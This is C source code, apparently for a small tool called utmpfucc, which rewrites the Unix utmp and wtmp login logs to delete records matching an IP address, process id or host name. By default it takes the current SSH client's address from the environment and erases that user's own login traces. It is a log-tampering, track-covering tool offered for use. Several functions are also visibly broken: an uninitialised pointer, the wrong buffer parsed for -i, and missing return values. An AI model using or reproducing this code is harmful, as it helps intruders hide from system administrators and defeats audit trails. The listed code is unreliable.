#include "utmpfucc.h"

#define PROG_VERSION "0.1"
#define PROG_NAME    "utmpfucc"

/* a mostly empty struct with only the fields set that we want to remove,
   and a pointer to it. the fields are compared in compare_record() */
utmp t;
utmp *target = &t;

/* the name the program was called as. mostly for use with --help */
char *argv0;

void usage()
{
	printf(
"usage: %s [OPTION]...\n"
"remove entries from utmp/wtmp logs"
"\n"
"   -p, --pid=NUMBER    specify pid to remove\n"
"   -i, --ip=IP         specify ip address to remove\n"
"   -m, --host=STRING   specify (part of) host name to remove\n"
"   -D, --dump          print all records without changing anything\n"
"   -f, --file=FILE     file to modify (default /var/run/utmp, /var/log/wtmp)\n"
"   -n, --dry-run       don't modify log files\n"
"   -v, --verbose       control verbosity (can be specified multiple times)\n"
"   -h, --help          display this help and exit\n"
"   -V, --version       output version information and exit\n"
"\n"
"examples:\n"
"   %s --ip 4.3.2.1\t# remove records from ip 4.3.2.1\n"
"   %s -m someisp.com\t# remove records with 'someisp.com' in the host field\n"
"   %s -f file --dump\t# read all records from file\n"
"\n",
	       argv0, argv0, argv0, argv0
	);
	exit(0);
}

void version()
{
	printf("%s v%s copyright @reptar_xl, %s\n"
	       "<https://github.com/raincoats/utmpfucc>\n"
	       "\n"
	       "LICENSE: in order to use this software, you have to help an elderly\n"
	       "neighbour change a lightbulb, or mow the lawn, something like that.\n"
	       "after that, the MIT license applies.\n"
	       "\n",
	       argv0, PROG_VERSION, __DATE__
	);
	exit(0);
}

// debug and general messages
// always enabled
void _(char *fmt, ...)
{
	va_list args;
    va_start(args, fmt);
    dprintf(2, "\033[38;5;032m[+]\033[m ");
    vdprintf(2, fmt, args);
    dprintf(2, "\n");
    va_end(args);
}

// verbosity level 1
// enabled with -v
void _1(char *fmt, ...)
{
	if (verbose < 1)
		return;

	va_list args;
    va_start(args, fmt);
    dprintf(2, "\033[38;5;121m[1]\033[m ");
    vdprintf(2, fmt, args);
    dprintf(2, "\n");
    va_end(args);
}

// etc
// enabled with -vv
void _2(char *fmt, ...)
{
	if (verbose < 2)
		return;

	va_list args;
    va_start(args, fmt);
    dprintf(2, "\033[38;5;192m[2]\033[m ");
    vdprintf(2, fmt, args);
    dprintf(2, "\n");
    va_end(args);
}


bool compare_record(utmp *current)
{
	int match = false;

	if (target->ut_pid != 0 && target->ut_pid == current->ut_pid) {
		_2("%s: '%d'=='%d'", "ut_pid", target->ut_pid, current->ut_pid);
		match++;
	}
	else if (target->ut_addr != 0 && target->ut_addr == current->ut_addr) {
		_2("%s: '0x%08x'=='0x%08x'", "ut_addr", target->ut_addr, current->ut_addr);
		match++;
	}
	else if ((strlen(target->ut_host) > 0)
		&& (strstr(current->ut_host, target->ut_host) > 0)) {
		_2("%s: '%s'=='%s'", "ut_host", target->ut_host, current->ut_host);
		match++;
	}

	char *msg = format_record(current);

	if (match) {
		printf("\033[38;5;196m%s\033[m -- REMOVED!\n", msg);
	}
	else if (verbose) {
		printf("%s\n", msg);
	}
	free(msg);	

	return match;
}

void time_to_string(char *timebuf, size_t buflen, time_t sec)
{
	time_t *s = &sec;
	struct tm *tm = localtime(s);

	if (tm == NULL)
		die("localtime");

	if (! strftime(timebuf, buflen, "%F %H:%M", tm))
		_("error in strftime");
}

void ip_to_string(char *ipbuf, void *ip)
{
	struct in_addr *i = (struct in_addr *)ip;

	if (! inet_ntop(AF_INET, ip, ipbuf, INET_ADDRSTRLEN))
		_("inet_ntop: could not unpack 0x%08x", i->s_addr);
}


/*
 *   format a utmp record in the style of who(1), with an added pid column
 */
char *format_record(utmp *r)
{
	char comment[32];
	char timebuf[32];
	char ip[INET_ADDRSTRLEN];

	time_to_string(timebuf, sizeof(timebuf), (time_t)r->ut_tv.tv_sec);
	ip_to_string(ip, &(r->ut_addr));

	memset(comment, '\0', sizeof(comment));

	if (r->ut_addr != 0) {
		snprintf(comment, sizeof(comment), "(%s)", ip);
	}
	else if (strlen(r->ut_host) > 0) {
		snprintf(comment, sizeof(comment), "(%s)", r->ut_host);
	}

	char *ret;
	if (! asprintf(&ret, "%-8d %-8s %-12s %-16s %s",
		r->ut_pid, r->ut_user, r->ut_line, timebuf, comment))
		die("asprintf error");

	return ret;
}

/*
 *    print a record made in format_record(), and then free it because we used
 *    asprintf(3). we want valgrind to pat us on the head and give us an A+
 */
void print_record(utmp *r)
{
	char *line = format_record(r);
	printf("%s\n", line);
	free(line);
}


void dump_all_records(FILE *utmp_file)
{
	size_t r_size;
	char buf[sizeof(utmp)];

	printf("%-8s %-8s %-12s %-16s %s\n", "PID", "NAME", "LINE", "TIME", "COMMENT");
	while ((r_size = fread(buf, 1, sizeof(utmp), utmp_file)) > 0)
	{
		print_record((utmp *)buf);
	}

	fclose(utmp_file);
}

/*
 *   try and get the ip address to remove from the environment. first try the
 *   environment variable SSH_CLIENT, then SSH_CONNECTION, else return null.
 */
char *divine_ip_from_environ(void)
{
	char *ip, *env = getenv("SSH_CLIENT");

	if (env == NULL)
	{
		env = getenv("SSH_CONNECTION");
		
		if (env == NULL)
		{
			_1("could not find ip in environment");
			return NULL;
		}
	}

	ip = strtok(env, " ");

	if (ip == NULL) {
		_("BUG: ip is null on line %d of %s, "
		  "but the environment variables were there?", __LINE__, __FILE__);
		_("contents of relevant environment variable were '%s'", env);
		return NULL;
	}
	else {
		_("got ip='%s' from environment", ip);
	}

	return ip;
}


in_addr_t string_to_ip(void *str)
{
	struct in_addr *addr;

	if (! inet_pton(AF_INET, (char *)str, addr)) {
		char *err;
		asprintf(&err, 
			"inet_pton: could not make string '%s' into an in_addr_t", str);
		die(err);
	}

	return addr->s_addr;
}


void do_getopts(int argc, char **argv)
{
	while (1 + 1 == 2)
	{
		int c;
		int *i = 0;
		char *shortopts = "p:i:hvVDf:m:n";

		// some tmp bufs for -i
		char in_addr_buf[sizeof(struct in_addr)];
		// struct in_addr *p = (struct in_addr *)in_addr_buf;
		int ip;

		struct option longopts[] = {
			{ "pid",     required_argument, 0, 'p' },
			{ "ip",      required_argument, 0, 'i' },
			{ "help",    no_argument,       0, 'h' },
			{ "version", no_argument,       0, 'V' },
			{ "dump",    no_argument,       0, 'D' },
			{ "file",    required_argument, 0, 'f' },
			{ "host",    required_argument, 0, 'm' },
			{ "dry-run", required_argument, 0, 'n' },
			{ NULL,      0,                 0,  0  }
		};

		c = getopt_long(argc, argv, shortopts, longopts, i);

		if (c < 0)
			break;

		switch (c)
		{
			case 0:
				if (longopts[*i].flag != 0)
					break;
				_2("'--%s' set via longopts", longopts[*i].name);
				break;

			case 'h': usage();
			case 'V': version();
			case 'v':
				verbose++;
				_2("verbose level %d enabled", verbose);
				break;

			case 'D':
				only_dump = true;
				_2("dump only enabled");
				break;

			case 'f':
				memset(utmp_filename, '\0', sizeof(utmp_filename));
				strncpy(utmp_filename, optarg, sizeof(utmp_filename));
				break;

			case 'p':
				divine_ip = false;
				target->ut_pid = (pid_t)atoi(optarg);
				_2("target pid: %d", target->ut_pid);
				break;

			case 'i':
				divine_ip = false;
				target->ut_addr = string_to_ip(in_addr_buf);
				_2("target ip: 0x%08x", target->ut_addr);
				break;

			case 'm':
				divine_ip = false;
				strncpy(target->ut_host, optarg, 255);
				_2("target host: %s", target->ut_host);
				break;

			case 'n':
				dry_run = true;
				_2("dry run enabled");
				break;
		}
	}
}


/*
 *  read, censor and rewrite a utmp file
 */
bool do_utmp_file(char *filename)
{
	size_t r_size = 0;
	size_t w_size = 0;
	int lines = 0;
	char buf[sizeof(utmp)];

	FILE *file = fopen(filename, "r");
	FILE *tmp = tmpfile();


	if (file == NULL)
		die(filename);
	if (tmp == NULL)
		die("could not open temp file");

	if (only_dump) {
		dump_all_records(file);
		return 0;
	}

	/* read log file, compare records to see if they need to disappear, write
	   to temp file */
	while ((r_size = fread(buf, 1, sizeof(utmp), file)) > 0)
	{
		lines++;

		if (compare_record((utmp *)buf)) {
			// the current utmp record needed to be censored
		}
		else {
			w_size = fwrite(buf, 1, r_size, tmp);
		}
		
		_2("[reading %s] line %d, read/write: %ld/%ld",
			filename, lines, r_size, w_size);
	}


	/* write the edited temporary file to the log */
	if (! dry_run)
	{
		lines = 0;
		freopen(filename, "w", file);
		rewind(tmp);

		while ((r_size = fread(buf, 1, sizeof(utmp), tmp)) > 0) {
			w_size = fwrite(buf, 1, r_size, file);
			lines++;
			_2("[writing %s] line %d, line read/write: %ld/%ld",
				filename, lines, r_size, w_size);
		}
	}

	fclose(file);
	fclose(tmp);
}




int main(int argc, char **argv)
{
	argv0 = (argv[0] == NULL)? PROG_NAME : basename(argv[0]);

	memset(target, '\0', sizeof(utmp));

	do_getopts(argc, argv);

	if (divine_ip) {
		char *ip = divine_ip_from_environ();
		if (ip == NULL) {
			_("could not get ip from environment. provide one with '-i'");
			return 1;
		}
		target->ut_addr = string_to_ip(ip);
	}

	if (file_given) {
		do_utmp_file(utmp_filename);
	}
	else {
		do_utmp_file("utmp");
		do_utmp_file("wtmp");		
	}

	return 0;
}

